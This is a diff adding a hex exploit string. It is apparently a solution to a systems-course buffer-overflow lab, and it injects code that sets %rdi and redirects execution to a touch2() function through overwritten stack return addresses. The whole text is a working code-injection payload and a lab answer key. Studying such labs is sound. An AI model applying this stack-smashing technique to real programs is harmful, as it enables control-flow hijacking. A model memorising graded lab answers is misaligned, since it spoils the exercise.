@@ -1,0 +1,8 @@
+bf 98 c6 3e 22 c3 00 00 /* mov 0x223ec698, %rdi; retq */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+98 ca 66 55 00 00 00 00 /* call the code at the top of the stack */
+98 ca 66 55 00 00 00 00 /* call again for 16 byte alignment */
+a3 1c 40 00 00 00 00 00 /* return to touch2() */
